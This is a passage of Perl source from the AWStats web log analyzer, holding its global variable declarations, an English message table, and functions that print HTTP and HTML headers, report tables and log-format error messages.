();\n%NotPageList = ();\n%DayBytes    = %DayHits               = %DayPages  = %DayVisits   = ();\n%MaxNbOf     = %MinHit                = ();\n%ListOfYears = %HistoryAlreadyFlushed = %PosInFile = %ValueInFile = ();\n%val = %nextval = %egal = ();\n%TmpDNSLookup = %TmpOS = %TmpRefererServer = %TmpRobot = %TmpBrowser = ();\n%MyDNSTable = ();\nuse vars qw/\n  %FirstTime %LastTime\n  %MonthHostsKnown %MonthHostsUnknown\n  %MonthUnique %MonthVisits\n  %MonthPages %MonthHits %MonthBytes\n  %MonthNotViewedPages %MonthNotViewedHits %MonthNotViewedBytes\n  %_session %_browser_h %_browser_p\n  %_domener_p %_domener_h %_domener_k %_errors_h %_errors_k\n  %_filetypes_h %_filetypes_k %_filetypes_gz_in %_filetypes_gz_out\n  %_host_p %_host_h %_host_k %_host_l %_host_s %_host_u\n  %_waithost_e %_waithost_l %_waithost_s %_waithost_u\n  %_keyphrases %_keywords %_os_h %_os_p %_pagesrefs_p %_pagesrefs_h %_robot_h %_robot_k %_robot_l %_robot_r\n  %_worm_h %_worm_k %_worm_l %_login_h %_login_p %_login_k %_login_l %_screensize_h\n  %_misc_p %_misc_h %_misc_k\n  %_cluster_p %_cluster_h %_cluster_k\n  %_se_referrals_p %_se_referrals_h %_sider_h %_referer_h %_err_host_h %_url_p %_url_k %_url_e %_url_x\n  %_downloads\n  %_unknownreferer_l %_unknownrefererbrowser_l\n  %_emails_h %_emails_k %_emails_l %_emailr_h %_emailr_k %_emailr_l\n  /;\n&Init_HashArray();\n\n# ---------- Init Regex --------\nuse vars qw/ $regclean1 $regclean2 $regdate /;\n$regclean1 = qr/<(recnb|\\/td)>/i;\n$regclean2 = qr/<\\/?[^<>]+>/i;\n$regdate   = qr/(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)(\\d\\d)(\\d\\d)(\\d\\d)/;\n\n# ---------- Init Tie::hash arrays --------\n# Didn't find a tie that increase speed\n#use Tie::StdHash;\n#use Tie::Cache::LRU;\n#tie %_host_p, 'Tie::StdHash';\n#tie %TmpOS, 'Tie::Cache::LRU';\n\n# PROTOCOL CODES\nuse vars qw/ %httpcodelib %ftpcodelib %smtpcodelib /;\n\n# DEFAULT MESSAGE\nuse vars qw/ @Message /;\n@Message = (\n\t'Unknown',\n\t'Unknown (unresolved ip)',\n\t'Others',\n\t'View details',\n\t'Day',\n\t'Month',\n\t'Year',\n\t'Statistics for',\n\t'First visit',\n\t'Last visit',\n\t'Number of visits',\n\t'Unique visitors',\n\t'Visit',\n\t'different keywords',\n\t'Search',\n\t'Percent',\n\t'Traffic',\n\t'Domains/Countries',\n\t'Visitors',\n\t'Pages-URL',\n\t'Hours',\n\t'Browsers',\n\t'',\n\t'Referers',\n\t'Never updated (See \\'Build/Update\\' on awstats_setup.html page)',\n\t'Visitors domains/countries',\n\t'hosts',\n\t'pages',\n\t'different pages-url',\n\t'Viewed',\n\t'Other words',\n\t'Pages not found',\n\t'HTTP Error codes',\n\t'Netscape versions',\n\t'IE versions',\n\t'Last Update',\n\t'Connect to site from',\n\t'Origin',\n\t'Direct address / Bookmarks',\n\t'Origin unknown',\n\t'Links from an Internet Search Engine',\n\t'Links from an external page (other web sites except search engines)',\n\t'Links from an internal page (other page on same site)',\n\t'Keyphrases used on search engines',\n\t'Keywords used on search engines',\n\t'Unresolved IP Address',\n\t'Unknown OS (Referer field)',\n\t'Required but not found URLs (HTTP code 404)',\n\t'IP Address',\n\t'Error&nbsp;Hits',\n\t'Unknown browsers (Referer field)',\n\t'different robots',\n\t'visits/visitor',\n\t'Robots/Spiders visitors',\n\t'Free realtime logfile analyzer for advanced web statistics',\n\t'of',\n\t'Pages',\n\t'Hits',\n\t'Versions',\n\t'Operating Systems',\n\t'Jan',\n\t'Feb',\n\t'Mar',\n\t'Apr',\n\t'May',\n\t'Jun',\n\t'Jul',\n\t'Aug',\n\t'Sep',\n\t'Oct',\n\t'Nov',\n\t'Dec',\n\t'Navigation',\n\t'File type',\n\t'Update now',\n\t'Bandwidth',\n\t'Back to main page',\n\t'Top',\n\t'dd mmm yyyy - HH:MM',\n\t'Filter',\n\t'Full list',\n\t'Hosts',\n\t'Known',\n\t'Robots',\n\t'Sun',\n\t'Mon',\n\t'Tue',\n\t'Wed',\n\t'Thu',\n\t'Fri',\n\t'Sat',\n\t'Days of week',\n\t'Who',\n\t'When',\n\t'Authenticated users',\n\t'Min',\n\t'Average',\n\t'Max',\n\t'Web compression',\n\t'Bandwidth saved',\n\t'Compression on',\n\t'Compression result',\n\t'Total',\n\t'different keyphrases',\n\t'Entry',\n\t'Code',\n\t'Average size',\n\t'Links from a NewsGroup',\n\t'KB',\n\t'MB',\n\t'GB',\n\t'Grabber',\n\t'Yes',\n\t'No',\n\t'Info.',\n\t'OK',\n\t'Exit',\n\t'Visits duration',\n\t'Close window',\n\t'Bytes',\n\t'Search&nbsp;Keyphrases',\n\t'Search&nbsp;Keywords',\n\t'different refering search engines',\n\t'different refering sites',\n\t'Other phrases',\n\t'Other logins (and/or anonymous users)',\n\t'Refering search engines',\n\t'Refering sites',\n\t'Summary',\n\t'Exact value not available in \"Year\" view',\n\t'Data value arrays',\n\t'Sender EMail',\n\t'Receiver EMail',\n\t'Reported period',\n\t'Extra/Marketing',\n\t'Screen sizes',\n\t'Worm/Virus attacks',\n\t'Hit on favorite icon',\n\t'Days of month',\n\t'Miscellaneous',\n\t'Browsers with Java support',\n\t'Browsers with Macromedia Director Support',\n\t'Browsers with Flash Support',\n\t'Browsers with Real audio playing support',\n\t'Browsers with Quictime audio playing support',\n\t'Browsers with Windows Media audio playing support',\n\t'Browsers with PDF support',\n\t'SMTP Error codes',\n\t'Countries',\n\t'Mails',\n\t'Size',\n\t'First',\n\t'Last',\n\t'Exclude filter',\n'Codes shown here gave hits or traffic \"not viewed\" by visitors, so they are not included in other charts.',\n\t'Cluster',\n'Robots shown here gave hits or traffic \"not viewed\" by visitors, so they are not included in other charts.',\n\t'Numbers after + are successful hits on \"robots.txt\" files',\n'Worms shown here gave hits or traffic \"not viewed\" by visitors, so thay are not included in other charts.',\n'Not viewed traffic includes traffic generated by robots, worms, or replies with special HTTP status codes.',\n\t'Traffic viewed',\n\t'Traffic not viewed',\n\t'Monthly history',\n\t'Worms',\n\t'different worms',\n\t'Mails successfully sent',\n\t'Mails failed/refused',\n\t'Sensitive targets',\n\t'Javascript disabled',\n\t'Created by',\n\t'plugins',\n\t'Regions',\n\t'Cities',\n\t'Opera versions',\n\t'Safari versions',\n\t'Chrome versions',\n\t'Konqueror versions',\n\t',',\n \t'Downloads',\n \t'Export CSV'\n);\n\n#------------------------------------------------------------------------------\n# Functions\n#------------------------------------------------------------------------------\n\n# Function to solve pb with openvms\nsub file_filt (@) {\n\tmy @retval;\n\tforeach my $fl (@_) {\n\t\t$fl =~ tr/^//d;\n\t\tpush @retval, $fl;\n\t}\n\treturn sort @retval;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tWrite on output header of HTTP answer\n# Parameters:\tNone\n# Input:\t\t$HeaderHTTPSent $BuildReportFormat $PageCode $Expires\n# Output:\t\t$HeaderHTTPSent=1\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub http_head {\n\tif ( !$HeaderHTTPSent ) {\n\t\tmy $newpagecode = $PageCode ? $PageCode : \"utf-8\";\n\t\tif ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' ) {\n\t\t\tprint( $ENV{'HTTP_USER_AGENT'} =~ /MSIE|Googlebot/i\n\t\t\t\t? \"Content-type: text/html; charset=$newpagecode\\n\"\n\t\t\t\t: \"Content-type: text/xml; charset=$newpagecode\\n\"\n\t\t\t);\n\t\t}\n\t\telse { print \"Content-type: text/html; charset=$newpagecode\\n\"; }\n\n# Expires must be GMT ANSI asctime and must be after Content-type to avoid pb with some servers (SAMBAR)\n\t\tif ( $Expires =~ /^\\d+$/ ) {\n\t\t\tprint \"Cache-Control: public\\n\";\n\t\t\tprint \"Last-Modified: \" . gmtime($starttime) . \"\\n\";\n\t\t\tprint \"Expires: \" . ( gmtime( $starttime + $Expires ) ) . \"\\n\";\n\t\t}\n\t\tprint \"\\n\";\n\t}\n\t$HeaderHTTPSent++;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tWrite on output header of HTML page\n# Parameters:\tNone\n# Input:\t\t%HTMLOutput $PluginMode $Expires $Lang $StyleSheet $HTMLHeadSection $PageCode $PageDir\n# Output:\t\t$HeaderHTMLSent=1\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub html_head {\n\tmy $dir = $PageDir ? 'right' : 'left';\n\tif ($NOHTML) { return; }\n\tif ( scalar keys %HTMLOutput || $PluginMode ) {\n\t\tmy $periodtitle = \" ($YearRequired\";\n\t\t$periodtitle .= ( $MonthRequired ne 'all' ? \"-$MonthRequired\" : \"\" );\n\t\t$periodtitle .= ( $DayRequired   ne ''    ? \"-$DayRequired\"   : \"\" );\n\t\t$periodtitle .= ( $HourRequired  ne ''    ? \"-$HourRequired\"  : \"\" );\n\t\t$periodtitle .= \")\";\n\n\t\t# Write head section\n\t\tif ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' ) {\n\t\t\tif ($PageCode) {\n\t\t\t\tprint \"<?xml version=\\\"1.0\\\" encoding=\\\"$PageCode\\\"?>\\n\";\n\t\t\t}\n\t\t\telse { print \"<?xml version=\\\"1.0\\\" encoding=\\\"iso-8859-1\\\"?>\\n\"; }\n\t\t\tif ( $FrameName ne 'index' ) {\n\t\t\t\tprint\n\"<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\\n\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint\n\"<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Frameset//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd\\\">\\n\";\n\t\t\t}\n\t\t\tprint\n\"<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\" xml:lang=\\\"$Lang\\\">\\n\";\n\t\t}\n\t\telse {\n\t\t\tif ( $FrameName ne 'index' ) {\n\t\t\t\tprint\n\"<!DOCTYPE html PUBLIC \\\"-//W3C//DTD HTML 4.01 Transitional//EN\\\" \\\"http://www.w3.org/TR/html4/loose.dtd\\\">\\n\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint\n\"<!DOCTYPE html PUBLIC \\\"-//W3C//DTD HTML 4.01 Frameset//EN\\\" \\\"http://www.w3.org/TR/html4/frameset.dtd\\\">\\n\";\n\t\t\t}\n\t\t\tprint '<html lang=\"' . $Lang . '\"'\n\t\t\t  . ( $PageDir ? ' dir=\"rtl\"' : '' ) . \">\\n\";\n\t\t}\n\t\tprint \"<head>\\n\";\n\n\t\tmy $endtag = '>';\n\t\tif ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' ) {\n\t\t\t$endtag = ' />';\n\t\t}\n\n\t\t# Affiche tag meta generator\n\t\tprint\n\"<meta name=\\\"generator\\\" content=\\\"AWStats $VERSION from config file awstats.$SiteConfig.conf (http://www.awstats.org)\\\"$endtag\\n\";\n\n\t\t# Affiche tag meta robots\n\t\tif ($MetaRobot) {\n\t\t\tprint \"<meta name=\\\"robots\\\" content=\\\"\"\n\t\t\t  . ( $FrameName eq 'mainleft' ? 'no' : '' )\n\t\t\t  . \"index,\"\n\t\t\t  . (    $FrameName eq 'mainleft'\n\t\t\t\t  || $FrameName eq 'index' ? '' : 'no' )\n\t\t\t  . \"follow\\\"$endtag\\n\";\n\t\t}\n\t\telse {\n\t\t\tprint \"<meta name=\\\"robots\\\" content=\\\"noindex,nofollow\\\"$endtag\\n\";\n\t\t}\n\n\t\t# Affiche tag meta content-type\n\t\tif ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' ) {\n\t\t\tprint( $ENV{'HTTP_USER_AGENT'} =~ /MSIE|Googlebot/i\n\t\t\t\t? \"<meta http-equiv=\\\"content-type\\\" content=\\\"text/html; charset=\"\n\t\t\t\t  . ( $PageCode ? $PageCode : \"iso-8859-1\" )\n\t\t\t\t  . \"\\\" />\\n\"\n\t\t\t\t: \"<meta http-equiv=\\\"content-type\\\" content=\\\"text/xml; charset=\"\n\t\t\t\t  . ( $PageCode ? $PageCode : \"iso-8859-1\" )\n\t\t\t\t  . \"\\\"$endtag\\n\"\n\t\t\t);\n\t\t}\n\t\telse {\n\t\t\tprint\n\t\t\t  \"<meta http-equiv=\\\"content-type\\\" content=\\\"text/html; charset=\"\n\t\t\t  . ( $PageCode ? $PageCode : \"iso-8859-1\" )\n\t\t\t  . \"\\\"$endtag\\n\";\n\t\t}\n\n\t\tif ($Expires) {\n\t\t\tprint \"<meta http-equiv=\\\"expires\\\" content=\\\"\"\n\t\t\t  . ( gmtime( $starttime + $Expires ) )\n\t\t\t  . \"\\\"$endtag\\n\";\n\t\t}\n\t\tmy @k = keys\n\t\t  %HTMLOutput;    # This is to have a unique title and description page\n\t\tprint \"<meta http-equiv=\\\"description\\\" content=\\\"\"\n\t\t  . ucfirst($PROG)\n\t\t  . \" - Advanced Web Statistics for $SiteDomain$periodtitle\"\n\t\t  . ( $k[0] ? \" - \" . $k[0] : \"\" )\n\t\t  . \"\\\"$endtag\\n\";\n\t\tif ( $MetaRobot && $FrameName ne 'mainleft' ) {\n\t\t\tprint\n\"<meta http-equiv=\\\"keywords\\\" content=\\\"$SiteDomain, free, advanced, realtime, web, server, logfile, log, analyzer, analysis, statistics, stats, perl, analyse, performance, hits, visits\\\"$endtag\\n\";\n\t\t}\n\t\tprint \"<title>$Message[7] $SiteDomain$periodtitle\"\n\t\t  . ( $k[0] ? \" - \" . $k[0] : \"\" )\n\t\t  . \"</title>\\n\";\n\t\tif ( $FrameName ne 'index' ) {\n\n\t\t\tif ($StyleSheet) {\n\t\t\t\tprint \"<link rel=\\\"stylesheet\\\" href=\\\"$StyleSheet\\\" />\\n\";\n\t\t\t}\n\n# A STYLE section must be in head section. Do not use \" for number in a style section\n\t\t\tprint \"<style type=\\\"text/css\\\">\\n\";\n\n\t\t\tif ( !$StyleSheet ) {\n\t\t\t\tprint\n\"body { font: 11px verdana, arial, helvetica, sans-serif; background-color: #$color_Background; margin-top: 0; margin-bottom: 0; }\\n\";\n\t\t\t\tprint \".aws_bodyl  { }\\n\";\n\t\t\t\tprint\n\".aws_border { border-collapse: collapse; background-color: #$color_TableBG; padding: 1px 1px \"\n\t\t\t\t  . (    $BuildReportFormat eq 'xhtml'\n\t\t\t\t\t  || $BuildReportFormat eq 'xml' ? \"2px\" : \"1px\" )\n\t\t\t\t  . \" 1px; margin-top: 0px; margin-bottom: 0px; }\\n\";\n\t\t\t\tprint\n\".aws_title  { font: 13px verdana, arial, helvetica, sans-serif; font-weight: bold; background-color: #$color_TableBGTitle; text-align: center; margin-top: 0; margin-bottom: 0; padding: 1px 1px 1px 1px; color: #$color_TableTitle; }\\n\";\n\t\t\t\tprint\n\".aws_blank  { font: 13px verdana, arial, helvetica, sans-serif; background-color: #$color_Background; text-align: center; margin-bottom: 0; padding: 1px 1px 1px 1px; }\\n\";\n\t\t\t\tprint <<EOF;\n.aws_data {\n\tbackground-color: #$color_Background;\n\tborder-top-width: 1px;   \n\tborder-left-width: 0px;  \n\tborder-right-width: 0px; \n\tborder-bottom-width: 0px;\n}\n.aws_formfield { font: 13px verdana, arial, helvetica; }\n.aws_button {\n\tfont-family: arial,verdana,helvetica, sans-serif;\n\tfont-size: 12px;\n\tborder: 1px solid #ccd7e0;\n\tbackground-image : url($DirIcons/other/button.gif);\n}\nth\t\t{ border-color: #$color_TableBorder; border-left-width: 0px; border-right-width: 1px; border-top-width: 0px; border-bottom-width: 1px; padding: 1px 2px 1px 1px; font: 11px verdana, arial, helvetica, sans-serif; text-align:center; color: #$color_titletext; }\nth.aws\t{ border-color: #$color_TableBorder; border-left-width: 0px; border-right-width: 1px; border-top-width: 0px; border-bottom-width: 1px; padding: 1px 2px 1px 1px; font-size: 13px; font-weight: bold; }\ntd\t\t{ border-color: #$color_TableBorder; border-left-width: 0px; border-right-width: 1px; border-top-width: 0px; border-bottom-width: 1px; font: 11px verdana, arial, helvetica, sans-serif; text-align:center; color: #$color_text; }\ntd.aws\t{ border-color: #$color_TableBorder; border-left-width: 0px; border-right-width: 1px; border-top-width: 0px; border-bottom-width: 1px; font: 11px verdana, arial, helvetica, sans-serif; text-align:$dir; color: #$color_text; padding: 0px;}\ntd.awsm\t{ border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom-width: 0px; font: 11px verdana, arial, helvetica, sans-serif; text-align:$dir; color: #$color_text; padding: 0px; }\nb { font-weight: bold; }\na { font: 11px verdana, arial, helvetica, sans-serif; }\na:link    { color: #$color_link; text-decoration: none; }\na:visited { color: #$color_link; text-decoration: none; }\na:hover   { color: #$color_hover; text-decoration: underline; }\n.currentday { font-weight: bold; }\nEOF\n\t\t\t}\n\n\t\t\t# Call to plugins' function AddHTMLStyles\n\t\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLStyles'} } )\n\t\t\t{\n\t\t\t\tmy $function = \"AddHTMLStyles_$pluginname\";\n\t\t\t\t&$function();\n\t\t\t}\n\n\t\t\tprint \"</style>\\n\";\n\t\t}\n\n# les scripts necessaires pour trier avec Tablekit\n#\tprint \"<script type=\\\"text\\/javascript\\\" src=\\\"/js/prototype.js\\\"><\\/script>\";\n#\tprint \"<script type=\\\"text\\/javascript\\\" src=\\\"/js/fabtabulous.js\\\"><\\/script>\";\n#\tprint \"<script type=\\\"text\\/javascript\\\" src=\\\"/js/mytablekit.js\\\"><\\/script>\";\n\n\t\t# Call to plugins' function AddHTMLHeader\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLHeader'} } )\n\t\t{\n\t\t\tmy $function = \"AddHTMLHeader_$pluginname\";\n\t\t\t&$function();\n\t\t}\n\t\t\t\n\t\tprint \"</head>\\n\\n\";\n\t\tif ( $FrameName ne 'index' ) {\n\t\t\tprint \"<body style=\\\"margin-top: 0px\\\"\";\n\t\t\tif ( $FrameName eq 'mainleft' ) { print \" class=\\\"aws_bodyl\\\"\"; }\n\t\t\tprint \">\\n\";\n\t\t}\n\t}\n\t$HeaderHTMLSent++;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tWrite on output end of HTML page\n# Parameters:\t0|1 (0=no list plugins,1=list plugins)\n# Input:\t\t%HTMLOutput $HTMLEndSection $FrameName $BuildReportFormat\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub html_end {\n\tmy $listplugins = shift || 0;\n\tif ( scalar keys %HTMLOutput ) {\n\n\t\t# Call to plugins' function AddHTMLBodyFooter\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLBodyFooter'} } )\n\t\t{\n\n\t\t\t# my $function=\"AddHTMLBodyFooter_$pluginname()\";\n\t\t\t# eval(\"$function\");\n\t\t\tmy $function = \"AddHTMLBodyFooter_$pluginname\";\n\t\t\t&$function();\n\t\t}\n\n\t\tif ( $FrameName ne 'index' && $FrameName ne 'mainleft' ) {\n\t\t\tprint \"$Center<br /><br />\\n\";\n\t\t\tprint\n\"<span dir=\\\"ltr\\\" style=\\\"font: 11px verdana, arial, helvetica; color: #$color_text;\\\">\";\n\t\t\tprint\n\"<b>Advanced Web Statistics $VERSION</b> - <a href=\\\"http://www.awstats.org\\\" target=\\\"awstatshome\\\">\";\n\t\t\tprint $Message[169] . \" $PROG\";\n\t\t\tif ($listplugins) {\n\t\t\t\tmy $atleastoneplugin = 0;\n\t\t\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'init'} } ) {\n\t\t\t\t\tif ( !$atleastoneplugin ) {\n\t\t\t\t\t\t$atleastoneplugin = 1;\n\t\t\t\t\t\tprint \" ($Message[170]: \";\n\t\t\t\t\t}\n\t\t\t\t\telse { print \", \"; }\n\t\t\t\t\tprint \"$pluginname\";\n\t\t\t\t}\n\t\t\t\tif ($atleastoneplugin) { print \")\"; }\n\t\t\t}\n\t\t\tprint \"</a></span><br />\\n\";\n\t\t\tif ($HTMLEndSection) { print \"<br />\\n$HTMLEndSection\\n\"; }\n\t\t}\n\t\tprint \"\\n\";\n\t\tif ( $FrameName ne 'index' ) {\n\t\t\tif ( $FrameName ne 'mainleft' && $BuildReportFormat eq 'html' ) {\n\t\t\t\tprint \"<br />\\n\";\n\t\t\t}\n\t\t\tprint \"</body>\\n\";\n\t\t}\n\t\tprint \"</html>\\n\";\n\n\t\t#\t\tprint \"<!-- NEW PAGE --><!-- NEW SHEET -->\\n\";\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tPrint on stdout tab header of a chart\n# Parameters:\t$title $tooltipnb [$width percentage of chart title]\n# Input:\t\tNone\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub tab_head {\n\tmy $title     = shift;\n\tmy $tooltipnb = shift;\n\tmy $width     = shift || 70;\n\tmy $class     = shift;\n\n\t# Call to plugins' function TabHeadHTML\n\tmy $extra_head_html = '';\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'TabHeadHTML'} } ) {\n\t\tmy $function = \"TabHeadHTML_$pluginname\";\n\t\t$extra_head_html .= &$function($title);\n\t}\n\n\tif ( $width == 70 && $QueryString =~ /buildpdf/i ) {\n\t\tprint\n\"<table class=\\\"aws_border sortable\\\" border=\\\"0\\\" cellpadding=\\\"2\\\" cellspacing=\\\"0\\\" width=\\\"800\\\">\\n\";\n\t}\n\telse {\n\t\tprint\n\"<table class=\\\"aws_border sortable\\\" border=\\\"0\\\" cellpadding=\\\"2\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\">\\n\";\n\t}\n\n\tif ($tooltipnb) {\n\t\tprint \"<tr><td class=\\\"aws_title\\\" width=\\\"$width%\\\"\"\n\t\t  . Tooltip( $tooltipnb, $tooltipnb )\n\t\t  . \">$title \"\n\t\t  . $extra_head_html . \"</td>\";\n\t}\n\telse {\n\t\tprint \"<tr><td class=\\\"aws_title\\\" width=\\\"$width%\\\">$title \"\n\t\t  . $extra_head_html . \"</td>\";\n\t}\n\tprint \"<td class=\\\"aws_blank\\\">&nbsp;</td></tr>\\n\";\n\tprint \"<tr><td colspan=\\\"2\\\">\\n\";\n\tif ( $width == 70 && $QueryString =~ /buildpdf/i ) {\n\t\tprint\n\"<table class=\\\"aws_data\\\" border=\\\"1\\\" cellpadding=\\\"2\\\" cellspacing=\\\"0\\\" width=\\\"796\\\">\\n\";\n\t}\n\telse {\n\t\tprint\n\"<table class=\\\"aws_data\\\" border=\\\"1\\\" cellpadding=\\\"2\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\">\\n\";\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tPrint on stdout tab ender of a chart\n# Parameters:\tNone\n# Input:\t\tNone\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub tab_end {\n\tmy $string = shift;\n\tprint \"</table></td></tr></table>\";\n\tif ($string) {\n\t\tprint\n\"<span style=\\\"font: 11px verdana, arial, helvetica;\\\">$string</span><br />\\n\";\n\t}\n\tprint \"<br />\\n\\n\";\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tWrite error message and exit\n# Parameters:\t$message $secondmessage $thirdmessage $donotshowsetupinfo\n# Input:\t\t$HeaderHTTPSent $HeaderHTMLSent %HTMLOutput $LogSeparator $LogFormat\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub error {\n\tmy $message = shift || '';\n\tif ( scalar keys %HTMLOutput ) {\n\t\t$message =~ s/\\</&lt;/g;\n\t\t$message =~ s/\\>/&gt;/g;\n\t}\n\tmy $secondmessage      = shift || '';\n\tmy $thirdmessage       = shift || '';\n\tmy $donotshowsetupinfo = shift || 0;\n\n\tif ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) { http_head(); }\n\tif ( !$HeaderHTMLSent && scalar keys %HTMLOutput )   {\n\t\tprint \"<html><body>\\n\";\n\t\t$HeaderHTMLSent = 1;\n\t}\n\tif ($Debug) { debug( \"$message $secondmessage $thirdmessage\", 1 ); }\n\tmy $tagbold     = '';\n\tmy $tagunbold   = '';\n\tmy $tagbr       = '';\n\tmy $tagfontred  = '';\n\tmy $tagfontgrey = '';\n\tmy $tagunfont   = '';\n\tif ( scalar keys %HTMLOutput ) {\n\t\t$tagbold     = '<b>';\n\t\t$tagunbold   = '</b>';\n\t\t$tagbr       = '<br />';\n\t\t$tagfontred  = '<span style=\"color: #880000\">';\n\t\t$tagfontgrey = '<span style=\"color: #888888\">';\n\t\t$tagunfont   = '</span>';\n\t}\n\tif ( !$ErrorMessages && $message =~ /^Format error$/i ) {\n\n\t\t# Files seems to have bad format\n\t\tif ( scalar keys %HTMLOutput )   { print \"<br /><br />\\n\"; }\n\t\tif ( $message !~ $LogSeparator ) {\n\n\t\t\t# Bad LogSeparator parameter\n\t\t\tprint\n\"${tagfontred}AWStats did not found the ${tagbold}LogSeparator${tagunbold} in your log records.${tagbr}${tagunfont}\\n\";\n\t\t}\n\t\telse {\n\n\t\t\t# Bad LogFormat parameter\n\t\t\tprint\n\"AWStats did not find any valid log lines that match your ${tagbold}LogFormat${tagunbold} parameter, in the ${NbOfLinesForCorruptedLog}th first non commented lines read of your log.${tagbr}\\n\";\n\t\t\tprint\n\"${tagfontred}Your log file ${tagbold}$thirdmessage${tagunbold} must have a bad format or ${tagbold}LogFormat${tagunbold} parameter setup does not match this format.${tagbr}${tagbr}${tagunfont}\\n\";\n\t\t\tprint\n\t\t\t  \"Your AWStats ${tagbold}LogFormat${tagunbold} parameter is:\\n\";\n\t\t\tprint \"${tagbold}$LogFormat${tagunbold}${tagbr}\\n\";\n\t\t\tprint\n\t\t\t  \"This means each line in your web server log file need to have \";\n\t\t\tif ( $LogFormat == 1 ) {\n\t\t\t\tprint\n\"${tagbold}\\\"combined log format\\\"${tagunbold} like this:${tagbr}\\n\";\n\t\t\t\tprint( scalar keys %HTMLOutput ? \"$tagfontgrey<i>\" : \"\" );\n\t\t\t\tprint\n\"111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \\\"GET / HTTP/1.1\\\" 200 1234 \\\"http://www.fromserver.com/from.htm\\\" \\\"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\\\"\\n\";\n\t\t\t\tprint(\n\t\t\t\t\tscalar keys %HTMLOutput\n\t\t\t\t\t? \"</i>$tagunfont${tagbr}${tagbr}\\n\"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( $LogFormat == 2 ) {\n\t\t\t\tprint\n\"${tagbold}\\\"MSIE Extended W3C log format\\\"${tagunbold} like this:${tagbr}\\n\";\n\t\t\t\tprint( scalar keys %HTMLOutput ? \"$tagfontgrey<i>\" : \"\" );\n\t\t\t\tprint\n\"date time c-ip c-username cs-method cs-uri-sterm sc-status sc-bytes cs-version cs(User-Agent) cs(Referer)\\n\";\n\t\t\t\tprint(\n\t\t\t\t\tscalar keys %HTMLOutput\n\t\t\t\t\t? \"</i>$tagunfont${tagbr}${tagbr}\\n\"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( $LogFormat == 3 ) {\n\t\t\t\tprint\n\"${tagbold}\\\"WebStar native log format\\\"${tagunbold}${tagbr}\\n\";\n\t\t\t}\n\t\t\tif ( $LogFormat == 4 ) {\n\t\t\t\tprint\n\"${tagbold}\\\"common log format\\\"${tagunbold} like this:${tagbr}\\n\";\n\t\t\t\tprint( scalar keys %HTMLOutput ? \"$tagfontgrey<i><pre>\" : \"\" );\n\t\t\t\tprint\n\"111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \\\"GET / HTTP/1.1\\\" 200 1234\\n\";\n\t\t\t\tprint(\n\t\t\t\t\tscalar keys %HTMLOutput\n\t\t\t\t\t? \"</pre></i>$tagunfont${tagbr}${tagbr}\\n\"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( $LogFormat == 6 ) {\n\t\t\t\tprint\n\"${tagbold}\\\"Lotus Notes/Lotus Domino\\\"${tagunbold}${tagbr}\\n\";\n\t\t\t\tprint( scalar keys %HTMLOutput ? \"$tagfontgrey<i>\" : \"\" );\n\t\t\t\tprint\n\"111.22.33.44 - Firstname Middlename Lastname [10/Jan/2001:02:14:14 +0200] \\\"GET / HTTP/1.1\\\" 200 1234 \\\"http://www.fromserver.com/from.htm\\\" \\\"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\\\"\\n\";\n\t\t\t\tprint(\n\t\t\t\t\tscalar keys %HTMLOutput\n\t\t\t\t\t? \"</i></span>${tagbr}${tagbr}\\n\"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( $LogFormat !~ /^[1-6]$/ ) {\n\t\t\t\tprint \"the following personalized log format:${tagbr}\\n\";\n\t\t\t\tprint( scalar keys %HTMLOutput ? \"$tagfontgrey<i>\" : \"\" );\n\t\t\t\tprint \"$LogFormat\\n\";\n\t\t\t\tprint(\n\t\t\t\t\tscalar keys %HTMLOutput\n\t\t\t\t\t? \"</i>$tagunfont${tagbr}${tagbr}\\n\"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tprint\n\"And this is an example of records AWStats found in your log file (the record number $NbOfLinesForCorruptedLog in your log):\\n\";\n\t\t\tprint( scalar keys %HTMLOutput ? \"<br 